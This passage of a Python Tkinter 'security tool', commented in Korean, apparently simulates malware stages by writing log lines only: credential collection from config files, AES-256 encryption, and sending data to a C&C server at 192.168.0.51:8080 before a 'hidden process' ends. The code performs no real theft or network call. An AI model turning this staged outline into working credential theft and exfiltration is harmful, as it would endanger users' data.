                f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] [4단계] 인증 정보 수집: {credential_type} 구성 파일 스캔 및 데이터 암호화 준비.\n")
                f.write("    -> 내부 AES-256 암호화 적용...\n")
                
            # 6. 5단계: C&C 서버로 데이터 전송 시뮬레이션 (2초)
            time.sleep(2) 
            data_sample = base64.b64encode(b'System_Info_and_Credentials').decode()[:20] + "..."
            with open(log_path, 'a', encoding='utf-8') as f:
                f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] [5단계] C&C 서버 통신: 192.168.0.51:8080 으로 데이터 전송 시도.\n")
                f.write(f"    -> 전송 데이터 샘플 (Base64): {data_sample}\n")
                f.write("----------------------------------------------------------------\n")
                f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] 최종 작업 완료. 은닉 프로세스 종료.\n")
            
        except Exception as e:
            with open(log_path, 'a', encoding='utf-8') as f:
                f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] 오류 발생: {e}\n")


# ==============================================================================
# VI. 메인 실행 루프
# ==============================================================================

if __name__ == "__main__":
    # Tkinter GUI는 메인 스레드에서 실행되어야 합니다.
    root = tk.Tk()
    app = SecurityToolGUI(root)
    root.mainloop()